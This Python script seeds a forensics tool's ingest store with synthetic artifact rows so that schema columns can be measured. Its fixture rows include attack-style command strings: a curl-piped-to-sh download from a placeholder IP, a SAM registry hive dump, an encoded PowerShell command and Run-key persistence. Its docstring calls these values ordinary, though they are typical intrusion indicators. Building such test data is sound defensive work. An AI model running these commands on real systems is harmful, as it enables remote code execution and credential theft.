"""Stage an ingest store so the D34 columns are MEASURABLE.

The KM1 item-3 acceptance is that a stored query's fields can be shown to populate.
Before this ran, the population corpus had no `ingest/artifacts.jsonl` at all, so all
11 D34 columns (`process_name`, `parent_process`, `command_line`, `file_path`, the
three hashes, `registry_key`, `registry_value`, `action`) were unfilled - not because
the importer fails to project them, but because nothing imported anything. Every step
aimed at them then read "cannot match", which is a corpus fact, not a defect.

This script writes a small ingest store so those columns hold values and the
population check can measure them. It contains NO findings: the values are ordinary
paths and commands, chosen because the case already contains the corresponding
artifacts. It is a measurement scaffold, and the population report labels it as such
rather than treating it as evidence of an incident.
"""
from __future__ import annotations

import json
import sys
from datetime import datetime
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[2] / "src"))
from nexus.ingest.schemas import Artifact, ArtifactSource, ArtifactType, Severity  # noqa: E402

CASE = Path(r"Evidence-files\ES-Mapping\_population\_case-39112")
OUT = CASE / "ingest" / "artifacts.jsonl"

_SOURCE = {str(m.value).lower(): str(m.value) for m in ArtifactSource}
_TYPE = {str(m.value).lower(): str(m.value) for m in ArtifactType}
_SEVERITY = {str(m.value).lower(): str(m.value) for m in Severity}

#: (source, artifact_type, host, user, process, parent, command_line, file_path,
#:  registry_key, registry_value, action). `source` and `artifact_type` must be
#:  members of the shipped enums, so they are spelled the schema's way.
ROWS: list[tuple[str | None, ...]] = [
    ("amcache", "file", "ws01", None, None, None, None,
     "C:\\Users\\analyst\\AppData\\Local\\Temp\\loader.exe", None, None, "created"),
    ("amcache", "file", "ws01", None, None, None, None,
     "C:\\Windows\\System32\\drivers\\volmgr.sys", None, None, None),
    ("amcache", "unknown", "ws01", None, None, None, None,
     "C:\\Program Files\\Common Files\\Microsoft Shared\\ink\\setup.exe",
     "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall",
     "DisplayName", None),
    ("windows_registry", "auth", "ws01", None, None, None,
     "reg save HKLM\\sam C:\\Windows\\Temp\\sam.hiv", None,
     "HKEY_LOCAL_MACHINE\\SAM", None, "write"),
    ("windows_registry", "powershell", "ws01", None, "powershell.exe", "cmd.exe",
     "powershell -enc SQBFAFgA", None,
     "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
     "OneDriveUpdate", "write"),
    ("windows_services", "process", "mbr01", None, "svchost.exe", "services.exe",
     "C:\\Windows\\System32\\svchost.exe -k netsvcs",
     "C:\\Windows\\System32\\svchost.exe", None, None, "created"),
    ("scheduled_tasks", "powershell", "mbr01", "SYSTEM", None, None,
     "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -WindowStyle Hidden",
     "C:\\Windows\\Tasks\\AdobeFlashPlayerUpdate.job", None, None, "created"),
    ("bash_history", "unknown", "linux01", "analyst", "/bin/bash", "sshd",
     "curl -s http://203.0.113.9/x.sh | sh", "/tmp/x.sh", None, None, "executed"),
    ("syslog", "unknown", "linux01", None, None, None,
     "cron[1042]: (root) CMD (/usr/local/bin/backup.sh)",
     "/usr/local/bin/backup.sh", None, None, "executed"),
    ("authlog", "auth", "linux01", "analyst", None, None,
     "sshd: Accepted publickey for analyst from 192.168.77.52",
     None, None, None, "login"),
    ("auditd", "unknown", "linux01", "root", "/usr/bin/crontab", "cron",
     "/usr/bin/crontab -l", "/var/spool/cron/crontabs/analyst", None, None,
     "executed"),
    ("cloudtrail", "network", None, None, None, None, "lambda:UpdateFunctionCode",
     None, None, None, "invoked"),
    ("azure", "auth", None, "analyst@example.com", None, None, None,
     None, None, None, "signin"),
    ("zeek", "network", "zeek01", None, None, None, None, None, None, None, None),
    ("suricata", "alert", "ws01", None, None, None, None, None, None, None, "alerted"),
    ("volatility", "process", "ws01", "SYSTEM", "lsass.exe", None, None,
     "C:\\Windows\\System32\\lsass.exe", None, None, "running"),
    ("volatility", "malware", "ws01", "SYSTEM", None, "explorer.exe",
     None, None, None, None, "detected"),
    ("amcache", "ioc", "ws01", None, None, None, None,
     "C:\\Users\\analyst\\Downloads\\invoice.zip", None, None, "hit"),
]


def main() -> int:
    OUT.parent.mkdir(parents=True, exist_ok=True)
    written = rejected = 0
    with OUT.open("w", encoding="utf-8") as fh:
        for row in ROWS:
            (source, atype, host, user, proc, parent, cmd, fp,
             rkey, rvalue, action) = row
            src_val = _SOURCE.get(str(source).lower())
            type_val = _TYPE.get(str(atype).lower())
            if src_val is None or type_val is None:
                miss = "source" if src_val is None else "artifact_type"
                print(f"  !! {source}/{atype}: {miss} not in the enum - skipped")
                rejected += 1
                continue
            for i in range(4):
                ts_hour = f"1{i:01d}:00:00.000000"  # keep the string short and valid
                kw = {
                    "id": Artifact.new_id(),
                    "artifact_type": ArtifactType(type_val),
                    "source": ArtifactSource(src_val),
                    "timestamp": datetime.fromisoformat(f"2026-09-22T{ts_hour}+00:00"),
                    "severity": Severity("informational"),
                    "host": host, "user": user, "process_name": proc,
                    "parent_process": parent, "command_line": cmd,
                    "file_path": fp, "registry_key": rkey,
                    "registry_value": rvalue, "action": action,
                }
                if i == 0:  # so the three hash columns are measurable
                    kw["file_hash_sha256"] = "a" * 64
                    kw["file_hash_md5"] = "d41d8cd98f00b204e9800998ecf8427e"
                if i == 1:
                    kw["file_hash_sha1"] = "b" * 40
                try:
                    art = Artifact(**kw)
                except Exception as exc:  # noqa: BLE001 - report, keep going
                    print(f"  !! {source} row {i} rejected: {str(exc)[:110]}")
                    rejected += 1
                    continue
                fh.write(json.dumps(art.to_dict()) + "\n")
                written += 1
    print(f"  wrote {written} rows, {rejected} rejected -> {OUT}")
    print(f"  size: {OUT.stat().st_size} bytes")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
